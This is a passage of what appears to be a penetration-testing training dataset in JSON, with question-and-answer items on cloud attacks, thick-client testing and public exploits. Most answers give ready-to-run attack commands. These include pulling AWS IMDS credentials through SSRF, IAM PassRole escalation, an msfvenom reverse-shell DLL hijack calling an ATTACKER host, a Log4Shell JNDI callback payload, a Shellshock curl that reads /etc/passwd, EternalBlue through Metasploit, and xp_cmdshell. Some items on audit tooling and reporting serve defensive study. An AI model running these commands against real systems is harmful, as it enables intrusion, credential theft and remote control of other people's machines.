+    "answer": "AWS EC2 Instance Metadata Service (IMDS): (1) Confirm SSRF: inject http://169.254.169.254/ into URL parameter/header. (2) Enumerate metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ — lists attached IAM role name. (3) Get credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME. Response: {AccessKeyId, SecretAccessKey, Token, Expiration}. (4) Configure: export AWS_ACCESS_KEY_ID=; export AWS_SECRET_ACCESS_KEY=; export AWS_SESSION_TOKEN=. (5) aws sts get-caller-identity; aws iam list-policies --scope Local. IMDSv2 requires PUT token first: TOKEN=$(curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' http://169.254.169.254/latest/api/token); curl -H 'X-aws-ec2-metadata-token:$TOKEN' http://169.254.169.254/latest/meta-data/iam/security-credentials/.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 48,
+    "prompt": "What makes an S3 bucket vulnerable and how do you confirm public access?",
+    "answer": "S3 buckets are vulnerable when: (1) ACL grants s3:GetObject to 'AllUsers' or 'AuthenticatedUsers'. (2) Bucket policy allows public access. (3) Block Public Access settings are disabled. Confirmation: aws s3 ls s3://BUCKET_NAME --no-sign-request (no creds, anonymous). curl https://BUCKET_NAME.s3.amazonaws.com/ — returns XML listing if public. Common naming patterns: domain-name, company-backup, company-dev, company-assets, company-data, company-prod-config. Tool: s3scanner.py for automated permutation testing. Public bucket with PII data = Critical finding with regulatory implications (GDPR, HIPAA).",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 48,
+    "prompt": "Describe the AWS IAM privilege escalation via iam:PassRole and lambda:CreateFunction.",
+    "answer": "iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction = full privilege escalation to any role. Scenario: user can create Lambda functions and pass any role to them. (1) List roles: aws iam list-roles | grep admin. (2) Create function with admin role: aws lambda create-function --function-name pwn --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole --handler lambda_function.handler --zip-file fileb://exploit.zip. (3) Invoke: aws lambda invoke --function-name pwn output.txt. Function runs as AdminRole — can create IAM users, modify policies, access all services.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 48,
+    "prompt": "How do you use ScoutSuite for a cloud security audit?",
+    "answer": "ScoutSuite is an open-source multi-cloud security auditing tool. AWS: python3 scout.py aws --report-dir ./scout-report --no-browser (requires configured aws-cli credentials). Azure: python3 scout.py azure --cli (uses native az cli auth). GCP: python3 scout.py gcp --user-account. Output: HTML report in scout-report/ directory. Key sections: IAM (over-privileged roles, unused credentials), S3/Blob/Bucket (public access), Security Groups (0.0.0.0/0 inbound rules), CloudTrail (logging disabled), Key Management (KMS, rotation). Filter by Danger level to prioritize findings.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 48,
+    "prompt": "What are the top three cloud misconfigurations to check early in an assessment?",
+    "answer": "1. Public S3/GCS/Blob storage — test with no credentials. Exposed buckets often contain config files, backups, PII. 2. Overly permissive IAM — aws iam simulate-principal-policy tests effective permissions. Look for administrative rights attached to instance profiles accessible via SSRF. 3. Security group rules allowing 0.0.0.0/0 on sensitive ports — aws ec2 describe-security-groups | jq '.SecurityGroups[].IpPermissions[]' searching for FromPort 22, 3306, 5432, 1433 with CidrIp 0.0.0.0/0. These three consistently appear in cloud breach reports and are quick wins.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "How do you approach static analysis of a .NET thick client application?",
+    "answer": "Workflow: (1) De4dot deobfuscation (if obfuscated): de4dot.exe app.exe -o app_clean.exe. (2) Open in dnSpy. (3) Browse namespace tree — look for Auth, Login, Database, Crypto, Config namespaces. (4) Search All (Ctrl+F): strings 'password', 'api_key', 'secret', 'connection'. (5) Review connection string setup — often in App.config or hardcoded in constructors. (6) Look for SSL certificate validation bypass: ServicePointManager.ServerCertificateValidationCallback = () => true. (7) Find SQL query construction — often via string concatenation = SQLi. (8) Decompile to C# project for full analysis.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "How do you intercept thick client traffic with Burp Suite when the app is not a browser?",
+    "answer": "Steps: (1) Install Burp CA certificate in Windows system certificate store (not just browser): certmgr.msc -> Trusted Root Certification Authorities -> Import Burp CA. (2) For apps that use WinHTTP: set system proxy via ProxyCap or Proxifier to route all traffic through 127.0.0.1:8080. (3) Alternatively: add proxy settings to app configuration file if supported. (4) Some apps use hardcoded proxy settings — patch via dnSpy or hex editor. (5) For apps with certificate pinning: (a) patch validation code in dnSpy, (b) use Frida to hook and bypass pinning at runtime. Confirm interception with Burp seeing requests.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "What Process Monitor (Procmon) filters reveal security-relevant thick client behavior?",
+    "answer": "Useful Procmon filters for thick client testing: (1) Process Name = app.exe (filter to target process). (2) Result = NAME NOT FOUND + Path ends with .dll — reveals DLL hijacking opportunities in writable directories. (3) Path contains 'AppData' — shows config file locations. (4) Operation = ReadFile + Path contains config/passwords/credentials — reveals credential file reads. (5) Operation = WriteFile — shows what the app writes on startup/use (may include cleartext credentials). Capture startup sequence by starting Procmon before launching the app. Export filtered results to CSV for documentation.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "How do you exploit a DLL hijacking opportunity found in a thick client?",
+    "answer": "DLL hijacking: (1) Identify writable directory where app searches for a DLL not found (Procmon: NAME NOT FOUND on .dll in app directory). (2) Confirm write permission: icacls 'C:\\Program Files\\App'. (3) Create malicious DLL matching the name: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll. (4) Copy to target directory: copy evil.dll 'C:\\Program Files\\App\\missing.dll'. (5) Restart app (or wait for scheduled execution). (6) Catch reverse shell from context the app runs in (if service: SYSTEM, if user-launched: user context). DLL hijacking in services yields SYSTEM.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 49,
+    "prompt": "What database interaction tests should you run when analyzing a thick client?",
+    "answer": "1. Check if app connects directly to database server (not via API) — Procmon network connections or Wireshark. 2. Capture connection string (Procmon, Wireshark, dnSpy). 3. Extract credentials from connection string and connect directly: sqlcmd -S server -U user -P pass (try sa account). 4. Test SQL injection via app interface: enter ' in all input fields, look for error messages. 5. With connection string: connect from attacker and enumerate all tables directly. 6. MSSQL: check for xp_cmdshell access: EXEC xp_cmdshell 'whoami'. Direct DB access bypasses all application-layer security.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 50,
+    "prompt": "Describe the searchsploit workflow for rapidly finding and adapting public exploits.",
+    "answer": "Workflow: (1) Enumerate exact version: nmap -sV or curl -I or whatweb. (2) Search: searchsploit apache 2.4.49 or searchsploit vsftpd 2.3.4. (3) Review multiple hits — check dates and platform column. (4) Read source before running: searchsploit -x PATH. (5) Copy local: searchsploit -m PATH. (6) Check dependencies and hardcoded values (IPs, paths). (7) Adapt: update LHOST, target path, payload. (8) Test on local identical version first. (9) Run against target with listener ready. Always Google 'CVE-XXXX-XXXX exploit github' — community PoC may be better than Exploit-DB version.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 50,
+    "prompt": "Explain Log4Shell (CVE-2021-44228) — what makes it exploitable and how do you confirm it?",
+    "answer": "Log4Shell is a JNDI injection in Log4j 2.x (2.0-2.14.1). Log4j evaluates ${jndi:ldap://...} expressions in log messages. Any user-controlled string that gets logged is a vector (User-Agent, username, email, X-Forwarded-For). Confirmation: (1) Set up LDAP callback: marshalsec-0.0.3.jar LDAPRefServer + Burp Collaborator, or use interactsh. (2) Inject: ${jndi:ldap://ATTACKER_COLLABORATOR:1389/test} in User-Agent header. (3) If DNS/TCP callback received = vulnerable. RCE: serve a Java class via LDAP that executes commands when loaded by the victim's JVM. Many WAF bypasses: ${${lower:j}ndi:...}.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 50,
+    "prompt": "How do you exploit MS17-010 (EternalBlue) and what systems are vulnerable?",
+    "answer": "Vulnerable: unpatched Windows 7 SP1 / Windows Server 2008 R2 SP1 and earlier (unless MS17-010 patch applied). Exploit SMBv1 protocol bug. (1) Confirm vulnerability: nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5. If 'VULNERABLE' returned. (2) Metasploit: use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.5; set LHOST tun0; run. (3) Get SYSTEM shell. (4) Alternative: impacket-ping or manual Python scripts. Note: EternalBlue crashes the target on failure — test carefully. Yields SYSTEM access without credentials on vulnerable hosts.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 50,
+    "prompt": "What is Shellshock (CVE-2014-6271) and how do you test for it?",
+    "answer": "Shellshock is a vulnerability in Bash where environment variables with function definitions are parsed and executed beyond the function definition. CGI scripts pass HTTP headers as environment variables to Bash shells. Test: curl -A '() { :;}; echo; cat /etc/passwd' http://target.com/cgi-bin/test.cgi. The () { :;}; is a function definition, followed by executable code after the semicolon. If vulnerable: response includes /etc/passwd content. Alternative vectors: HTTP Referer, User-Agent, X-Forwarded-For headers (whichever is logged). Still present: legacy Linux web servers, appliances, embedded devices, old Docker images.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 50,
+    "prompt": "How should you document a CVE exploitation finding in a penetration test report?",
+    "answer": "CVE finding documentation: 1. Title: [System] [Version] — CVE-XXXX-XXXX ([Vulnerability Name]). 2. Severity (CVSS score + contextual justification). 3. Affected component: IP/hostname, software, exact version. 4. Vulnerability description: brief technical explanation of the bug. 5. Evidence: (a) Version detection screenshot, (b) Exploit command used (sanitize payload if needed), (c) Post-exploitation proof (whoami showing SYSTEM/root). 6. Impact: what could be achieved (code execution, data access, domain compromise). 7. Recommendation: (a) patch to version X, (b) disable feature, (c) network segmentation. 8. References: CVE link, vendor advisory, CVSS score.",
+    "difficulty": "beginner"
+  }
+]
